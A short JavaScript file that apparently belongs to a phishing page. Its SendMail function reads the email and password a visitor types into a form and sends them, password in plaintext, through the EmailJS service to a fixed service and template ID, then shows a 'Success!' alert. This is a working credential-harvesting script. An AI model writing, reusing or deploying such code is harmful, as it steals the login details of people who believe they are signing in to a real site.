//newscript.js
function SendMail() {
var params = {
  from_name: document.getElementById('email').value,
  email: document.getElementById('email').value,
  pswd: document.getElementById('pswd').value
}
emailjs.send('service_vboyhxc', 'template_ip4v46i', params).then(function (res){
  alert('Success!' + res.status)
})
}